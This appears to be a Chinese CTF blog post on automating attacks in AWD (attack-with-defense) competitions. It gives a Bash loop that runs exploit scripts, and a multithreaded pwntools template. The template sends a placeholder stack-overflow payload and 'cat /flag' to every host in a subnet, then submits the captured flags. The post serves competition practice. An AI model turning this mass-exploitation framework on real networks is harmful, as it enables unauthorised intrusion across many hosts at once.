---
title: AWD攻击：批量自动化攻击框架
date: 2026-03-16
tags:

- pwn
- awd
- 自动化
- python
categories:
- PWN
- PWN_ATTACK
- AWD

---



# 前言：

awd时写出exp要搭配自动化工具才能稳定拿分，把exp发给全场每个靶机



# Bash 调度流

最简单粗暴的批量攻击方式是写一个 Bash 脚本。如果你的目录里有针对不同题目的多个 EXP（比如 `exp1.py`, `exp2.py`），你可以用 Bash 脚本来遍历执行它们：

```bash
#!/bin/bash
# 用法：./attack.sh <目标IP> <端口>

for file in *; do
    if [[ $file =~ ^exp.*\.py$ ]]; then
        echo "正在执行 $file 攻击目标 $1:$2"
        # 调用 python 执行 exp，并将 IP 和 Port 作为参数传入
        python3 $file $1 $2 
    fi
done
```

**优点**：极其简单，EXP 脚本相互独立，就算某个 EXP 写崩了也不会影响其他脚本。 **缺点**：不支持多线程并发，打全场速度慢；无法统一管理拿到的 Flag 并自动提交。



# Python 高并发终极框架

在真实的 AWD 现场，为了抢在别人修补漏洞之前把分拿满，我们需要**多线程并发**。下面是一套基于 `concurrent.futures` 线程池和 `requests` 库的“全自动打靶 + 提交”框架。

只需要在比赛现场修改两处：**网络配置区** 和 **EXP 核心逻辑区**。

**批量打全场自动化模板 (`awd_framework.py`)**

```py
import requests
import re
from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== [1. 比赛网络配置区] ====================
# 这里填写的必须是官方手册明文规定的网段，绝对不要瞎填其他网段！
TEAM_IP_PREFIX = "192.168.1."  # 敌方队伍 IP 前缀 (如 192.168.1.x)
TEAM_START = 1                 # 起始队伍 ID
TEAM_END = 20                  # 结束队伍 ID (假设全场 20 个队)
TARGET_PORT = 8888             # 漏洞服务的端口

# Flag 提交 API 配置 (从手册获取，或通过 F12 抓包逆向获取)
# 【保底机制】：如果这里留空 ("")，脚本会自动将 Flag 写入同目录的 flag.txt 文件！
SUBMIT_URL = "" 
MY_TOKEN = ""

# 减少 Pwntools 的日志输出，保持控制台干净，只看战况
context.log_level = 'error' 

# ==================== [2. Flag 自动提交/本地存储逻辑] ====================
def submit_flag(flag, target_ip):
    """
    负责将获取到的 Flag 秒速提交到比赛平台的 API，或保存在本地
    """
    # 【新增】本地保存后备方案：如果没有配置 API 或 Token，就存进同目录的 flag.txt
    if not SUBMIT_URL or not MY_TOKEN:
        try:
            with open("flag.txt", "a") as f:
                f.write(f"[{target_ip}] {flag}\n")
            print(f"[+]  已保存到本地 flag.txt! 目标: {target_ip} | Flag: {flag}")
        except Exception as e:
            print(f"[x] 本地保存失败: {e}")
        return

    # API 提交逻辑
    headers = {
        "Authorization": f"Bearer {MY_TOKEN}",
        "Content-Type": "application/json"
    }
    data = {
        "flag": flag
    }
    try:
        # 注意：这里的 POST 请求格式(json/data/请求头)取决于具体比赛平台的 API 文档说明
        res = requests.post(SUBMIT_URL, headers=headers, json=data, timeout=3)
        if "success" in res.text or "true" in res.text:
            print(f"[+]  得分! 目标: {target_ip} | Flag: {flag}")
        elif "already" in res.text:
            print(f"[-] 重复提交. 目标: {target_ip}")
        else:
            print(f"[!] 提交失败. 目标: {target_ip} | 返回: {res.text}")
    except Exception as e:
        print(f"[x] 提交 API 请求异常: {e}")

# ==================== [3. EXP 核心逻辑区 (填入你的利用代码)] ====================
def attack(team_id):
    """
    针对单个 IP 的攻击逻辑。
    返回获取到的 Flag 字符串，如果失败返回 None。
    """
    target_ip = f"{TEAM_IP_PREFIX}{team_id}"
    
    # 强烈建议加 try-except！防止打某个队时遇到奇葩沙箱导致报错，拖垮整个线程池
    try:
        # 必须设置超时时间！防止被别人故意挂起连接（万人坑）卡死脚本
        io = remote(target_ip, TARGET_PORT, timeout=3)
        
        # ---------------- 你的 EXP 写在这里 ----------------
        # 假设这是一个非常简单的栈溢出后门题
        payload = b'a' * 0x28 + p64(0x401234) 
        io.sendlineafter(b"name:", payload)
        
        # 拿到 shell 后执行获取 flag 的命令
        io.sendline(b"cat /flag")
        
        # ---------------------------------------------------
        
        # 接收回显并用正则表达式精准提取 Flag
        output = io.recvall(timeout=2).decode(errors='ignore')
        io.close()
        
        # 假设 Flag 格式是 flag{...} 或者 basectf{...}
        # re.search 可以在对方故意输出的一大堆乱码防御信息中，精准抠出真 flag
        match = re.search(r'flag\{[a-zA-Z0-9_-]+\}', output) 
        if match:
            flag = match.group(0)
            print(f"[*]  击破 {target_ip} 获取到: {flag}")
            return flag, target_ip
        else:
            # print(f"[-] {target_ip} 攻击成功，但在回显中未找到 Flag")
            return None, target_ip
            
    except Exception as e:
        # 常见的报错是 connection refused (对方服务挂了/宕机了) 或 timeout
        # print(f"[x] {target_ip} 连接或攻击失败: {e}")
        return None, target_ip

# ==================== [4. 高并发主引擎] ====================
def main():
    print("======  AWD 自动化高频扫射系统启动  ======")
    
    # 使用 ThreadPoolExecutor 开 10 个线程并发打（速度极快）
    with ThreadPoolExecutor(max_workers=10) as executor:
        # 将所有的攻击任务塞进线程池
        futures = {executor.submit(attack, tid): tid for tid in range(TEAM_START, TEAM_END + 1)}
        
        # 只要有一个线程打完拿到了结果，立刻移交给 API 提交函数！
        for future in as_completed(futures):
            flag, ip = future.result()
            if flag:
                # 拿到 Flag 直接扔进提交/保存函数
                submit_flag(flag, ip)

if __name__ == '__main__':
    # 实战中为了在每个 Round 持续无脑拿分，这里通常会加一个大循环：
    # while True:
    #     main()
    #     print("本轮扫射完毕，等待 300 秒后进入下一轮...")
    #     time.sleep(300) 
    main()
```

**框架核心优势解析：**

1. **防卡死（Timeout 机制）**：很多队伍会故意挂起你的连接。如果在 `remote()` 和 `recvall()` 里不加 `timeout` 参数，你的脚本发出去几个就会全部卡死，后面的队伍根本打不到

2. **正则提取（Regex 提取）**：不用 `io.recvline()` 去拿 Flag。由于网络延迟、杂音输出甚至对方故意输出的干扰信息，你拿到的很可能不是纯净的 Flag。使用 `re.search(r'flag\{.*?\}', output)` 是最稳的，它能在成吨的垃圾数据中把真 Flag 抠出来。

3. **静默执行（Log Level）**：将 Pwntools 的日志级别设为 `error`，只打印获取成功和提交成功的信息，保证你的控制台清爽，一眼就能看到战况。

接下来，一旦你写出了针对某个题目的 payload，你只需要把核心的那几行 `io.sendline()` 塞进上面模板的 `[3. EXP 核心逻辑区]`，然后一键运行
